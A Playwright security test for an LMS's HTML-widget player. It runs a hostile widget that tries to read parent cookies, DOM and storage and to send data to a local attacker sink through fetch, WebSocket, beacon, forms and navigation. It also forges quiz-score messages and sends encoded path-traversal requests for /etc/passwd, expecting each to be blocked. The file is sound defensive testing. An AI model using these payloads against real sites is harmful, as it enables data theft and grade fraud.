/**
 * Security of LMS HTML widgets (author-uploaded HTML in the `html` block). A hostile widget runs in a real browser
 * under the production confinement: the iframe sandbox of the player (`HTML_WIDGET_SANDBOX`), the response headers
 * of the backend file route (CSP, nosniff, CORP, no cookies) and the player's message filter (`parseWidgetMessage`,
 * transpiled from the app source). Three local servers stand in for the LMS page, the widget file route and an
 * attacker sink; the sink must see no request. The last test hits the real file route of the API (:8000).
 *
 *   E2E_SKIP_PREFLIGHT=1 E2E_APPS=lms bunx playwright test e2e/lms-html-widget-security.spec.ts
 *
 * Zip-slip, absolute paths, unknown types, the expired token and the H5P token are checked against the real code in
 * iht-backend tests/lms/unit/test_html_widget_package.py (their only entry point is an authenticated upload).
 */

import { readFileSync } from "node:fs"
import { createServer, type IncomingMessage, type Server, type ServerResponse } from "node:http"
import type { AddressInfo } from "node:net"
import path from "node:path"
import { expect, test } from "@playwright/test"
import ts from "typescript"
import { URLS } from "./fixtures/env"

const SHOTS = process.env.E2E_SHOT_DIR ?? "/tmp/qa15"
const UTILS = path.resolve(__dirname, "../apps/lms/src/features/player/utils/html-widget.ts")

type Handler = (req: IncomingMessage, res: ServerResponse) => void
type Seen = { origin: string; data: { type?: string; out?: Record<string, string> } | null; fromWidget: boolean }
/** What the test page records (set by its inline script). */
type Recorder = { raw: Seen[]; accepted: unknown[] }

async function listen(handler: Handler): Promise<{ server: Server; port: number }> {
  const server = createServer(handler)
  const { promise, resolve } = Promise.withResolvers<void>()
  server.listen(0, "127.0.0.1", resolve)
  await promise
  return { server, port: (server.address() as AddressInfo).port }
}

/** The headers of `widget_headers` in iht-backend `lms_learning/handlers/html_widget.py`. */
function widgetHeaders(parentOrigin: string, type: string): Record<string, string> {
  return {
    "Content-Type": type,
    "Content-Security-Policy":
      "sandbox allow-scripts allow-popups; default-src 'self' data: blob:; script-src 'self' 'unsafe-inline'; " +
      "style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob: data:; " +
      `connect-src 'none'; form-action 'none'; frame-ancestors ${parentOrigin}; base-uri 'none'`,
    "X-Content-Type-Options": "nosniff",
    "Cross-Origin-Resource-Policy": "cross-origin",
    "Referrer-Policy": "no-referrer",
    "Access-Control-Allow-Origin": "*",
  }
}

function hostileWidget(sink: string): string {
  return `<!doctype html><html><body><h1>hostile widget</h1><script>
const out = {}
const tryIt = (name, fn) => { try { out[name] = String(fn()) } catch (e) { out[name] = "blocked:" + e.name } }
tryIt("parentDom", () => parent.document.getElementById("secret").textContent)
tryIt("parentCookie", () => parent.document.cookie)
tryIt("ownCookie", () => document.cookie)
tryIt("localStorage", () => localStorage.getItem("secret"))
tryIt("sessionStorage", () => sessionStorage.getItem("secret"))
tryIt("origin", () => self.origin)
fetch("${sink}/fetch").then(() => { out.fetch = "sent" }, (e) => { out.fetch = "blocked:" + e.name })
tryIt("xhr", () => { const x = new XMLHttpRequest(); x.open("GET", "${sink}/xhr"); x.send(); return "sent" })
tryIt("ws", () => { new WebSocket("${sink.replace("http", "ws")}/ws"); return "sent" })
tryIt("beacon", () => navigator.sendBeacon("${sink}/beacon", "x"))
tryIt("img", () => { new Image().src = "${sink}/img"; return "sent" })
tryIt("form", () => { const f = document.createElement("form"); f.method = "post"; f.action = "${sink}/form"; document.body.append(f); f.submit(); return "sent" })
tryIt("topNav", () => { top.location.href = "${sink}/top"; return "sent" })
tryIt("popup", () => { const w = window.open("popup.html", "_blank"); return w ? "opened" : "null" })
parent.postMessage({ type: "ihsp-widget-size", height: 99999 }, "*")
parent.postMessage({ type: "ihsp-widget-size", height: "1e9" }, "*")
parent.postMessage({ type: "ihsp-widget-result", score_pct: 150, passed: true }, "*")
parent.postMessage({ type: "ihsp-widget-result", score_pct: 70, passed: false }, "*")
setTimeout(() => parent.postMessage({ type: "probe", out }, "*"), 800)
</script></body></html>`
}

const POPUP = `<!doctype html><html><body><script>
let cookie; try { cookie = document.cookie } catch (e) { cookie = "blocked:" + e.name }
let opener; try { opener = window.opener && window.opener.document ? "readable" : "none" } catch (e) { opener = "blocked:" + e.name }
document.title = JSON.stringify({ origin: self.origin, cookie, opener })
</script></body></html>`

const SVG = `<svg xmlns="http://www.w3.org/2000/svg"><script>parent.postMessage({type:"svg-ran"},"*")</script></svg>`
const SNIFF = `<html><body><script>parent.postMessage({type:"sniff-ran"},"*")</script></body></html>`
const FORGER = (parent: string) =>
  `<!doctype html><script>parent.postMessage({type:"ihsp-widget-result",score_pct:100,passed:true},"${parent}")</script>`

/** The player's filter, transpiled from the app source: `getConfig` and `process` are stubbed (unused by it). */
function playerFilter(): string {
  const source = readFileSync(UTILS, "utf8").replace(/^import .*$/m, "")
  const js = ts.transpileModule(source, { compilerOptions: { target: ts.ScriptTarget.ES2022 } }).outputText
  return `const process = { env: {} }; const getConfig = () => ({});\n${js.replace(/^export /gm, "")}`
}

function parentPage(widget: string, attacker: string): string {
  return `<!doctype html><html><body>
<p id="secret">parent-dom-secret</p>
<iframe id="w" sandbox="allow-scripts allow-popups" referrerpolicy="no-referrer" style="height:400px;width:600px"
  src="${widget}/w/index.html"></iframe>
<iframe id="svg" sandbox="allow-scripts allow-popups" src="${widget}/w/pic.svg"></iframe>
<img id="svgimg" src="${widget}/w/pic.svg">
<iframe id="sniff" sandbox="allow-scripts allow-popups" src="${widget}/w/notes.txt"></iframe>
<iframe id="forger" src="${attacker}/forger.html"></iframe>
<script>${playerFilter()}
localStorage.setItem("secret", "parent-storage-secret")
window.accepted = []; window.raw = []
const frame = document.getElementById("w")
addEventListener("message", (event) => {
  window.raw.push({ origin: event.origin, data: event.data, fromWidget: event.source === frame.contentWindow })
  const message = parseWidgetMessage(event, frame.contentWindow)
  if (!message) return
  window.accepted.push(message)
  if (message.kind === "size") frame.style.height = message.height + "px"
})
</script></body></html>`
}

test("LMS HTML widget: a hostile widget stays confined", async ({ page, context }) => {
  const hits: string[] = []
  const sink = await listen((req, res) => {
    hits.push(req.url ?? "")
    res.end("sink")
  })
  const sinkOrigin = `http://127.0.0.1:${sink.port}`
  sink.server.on("upgrade", (req, socket) => {
    hits.push(req.url ?? "")
    socket.destroy()
  })
  let parentOrigin = ""
  const files: Record<string, [string, string]> = {
    "/w/index.html": ["text/html; charset=utf-8", hostileWidget(sinkOrigin)],
    "/w/popup.html": ["text/html; charset=utf-8", POPUP],
    "/w/pic.svg": ["image/svg+xml", SVG],
    "/w/notes.txt": ["text/plain; charset=utf-8", SNIFF],
  }
  const widget = await listen((req, res) => {
    const file = files[req.url ?? ""]
    res.writeHead(file ? 200 : 404, widgetHeaders(parentOrigin, file?.[0] ?? "text/plain")).end(file?.[1] ?? "")
  })
  // The widget lives on another host name than the page, like api.<domain> in dev.
  const widgetOrigin = `http://localhost:${widget.port}`
  const attacker = await listen((req, res) => {
    if (req.url === "/forger.html") res.writeHead(200, { "Content-Type": "text/html" }).end(FORGER("*"))
    else res.writeHead(404).end()
  })
  const attackerOrigin = `http://localhost:${attacker.port}`
  const host = await listen((_req, res) =>
    res
      .writeHead(200, { "Content-Type": "text/html", "Set-Cookie": "secret=parent-cookie-secret; Path=/" })
      .end(parentPage(widgetOrigin, attackerOrigin)),
  )
  parentOrigin = `http://127.0.0.1:${host.port}`

  try {
    const popup = context.waitForEvent("page", { timeout: 10_000 }).catch(() => null)
    await page.goto(`${parentOrigin}/`)
    await expect
      .poll(() => page.evaluate(() => (window as unknown as Recorder).raw.some((m) => m.data?.type === "probe")))
      .toBe(true)
    const raw = await page.evaluate(() => (window as unknown as Recorder).raw)
    const accepted = await page.evaluate(() => (window as unknown as Recorder).accepted)
    const probe = raw.find((m) => m.data?.type === "probe")?.data?.out ?? {}

    // Parent DOM, cookies, storage: the opaque origin reads none of them.
    expect(probe.parentDom).toMatch(/^blocked:SecurityError/)
    expect(probe.parentCookie).toMatch(/^blocked:SecurityError/)
    expect(probe.ownCookie).toMatch(/^(blocked:SecurityError|)$/)
    expect(probe.localStorage).toMatch(/^blocked:SecurityError/)
    expect(probe.sessionStorage).toMatch(/^blocked:SecurityError/)
    expect(probe.origin).toBe("null")
    // Top navigation: the page stays where it is.
    expect(probe.topNav).toMatch(/^blocked:/)
    expect(page.url()).toBe(`${parentOrigin}/`)
    // Network: fetch, XHR, WebSocket, beacon, image, form submit reach nobody.
    expect(probe.fetch).toMatch(/^blocked:TypeError/)
    await page.waitForTimeout(1500)
    expect(hits).toEqual([])
    // window.open: the popup inherits the sandbox (opaque origin, no cookies, no opener access).
    const opened = await popup
    expect(probe.popup).toBe("opened")
    expect(opened).not.toBeNull()
    if (opened) {
      await opened.waitForLoadState()
      const info = JSON.parse(await opened.title())
      expect(info.origin).toBe("null")
      expect(info.cookie).toMatch(/^(blocked:SecurityError|)$/)
      expect(info.opener).toMatch(/^(none|blocked:SecurityError)$/)
      await opened.close()
    }
    // Messages: the forged result from another origin is seen but rejected; malformed ones are dropped;
    // the oversized size is clamped to 2000 px; the widget's own valid result passes.
    expect(raw.some((m) => m.origin === attackerOrigin && m.data?.type === "ihsp-widget-result")).toBe(true)
    expect(accepted).toEqual([
      { kind: "size", height: 2000 },
      { kind: "result", scorePct: 70, passed: false },
    ])
    expect(await page.locator("#w").evaluate((el: HTMLElement) => el.style.height)).toBe("2000px")
    // SVG with a script (as a document in the sandbox it runs confined; as an image never) and MIME sniffing.
    expect(raw.filter((m) => m.data?.type === "svg-ran").every((m) => m.origin === "null")).toBe(true)
    expect(raw.some((m) => m.data?.type === "sniff-ran")).toBe(false)
    await page.locator("#w").scrollIntoViewIfNeeded()
    await page.screenshot({ path: `${SHOTS}/html-security-confined.png`, fullPage: true })

    // frame-ancestors: another site cannot frame the widget.
    const blocked = await listen((_req, res) =>
      res
        .writeHead(200, { "Content-Type": "text/html" })
        .end(`<iframe id="x" src="${widgetOrigin}/w/index.html"></iframe>`),
    )
    try {
      await page.goto(`http://127.0.0.1:${blocked.port}/`)
      await page.waitForTimeout(1000)
      const child = page.frames().find((f) => f.url().includes("/w/index.html"))
      const body = child ? await child.evaluate(() => document.body?.innerText ?? "").catch(() => "") : ""
      expect(body).not.toContain("hostile widget")
      await page.screenshot({ path: `${SHOTS}/html-security-frame-ancestors.png` })
    } finally {
      blocked.server.close()
    }
  } finally {
    for (const s of [sink, widget, attacker, host]) s.server.close()
  }
})

test("LMS HTML widget file route (real API): forged, expired or H5P-style tokens and traversal are 404", async ({
  request,
}) => {
  const base = `${URLS.api}/v1/lms/html-widgets`
  const probe = await request.get(`${base}/x/index.html`).catch(() => null)
  test.skip(!probe, `API not reachable at ${URLS.api}`)
  const h5pLike = "eyJwIjoiYSIsImUiOjF9.c2ln" // payload.signature shape of an H5P token, foreign key
  for (const url of [
    `${base}/not-a-token/index.html`,
    `${base}/${h5pLike}/index.html`,
    `${base}/${h5pLike}/..%2F..%2Fsecrets.txt`,
    `${base}/${h5pLike}/%2e%2e/%2e%2e/etc/passwd`,
  ]) {
    const response = await request.get(url)
    expect(response.status(), url).toBe(404)
    expect(response.headers()["set-cookie"]).toBeUndefined()
    // Dot segments are normalised before routing: they leave the widget route and get the generic 404.
    if (url.includes("%")) continue
    expect(response.headers()["x-content-type-options"]).toBe("nosniff")
    expect(response.headers()["content-security-policy"]).toContain("sandbox allow-scripts allow-popups")
  }
})
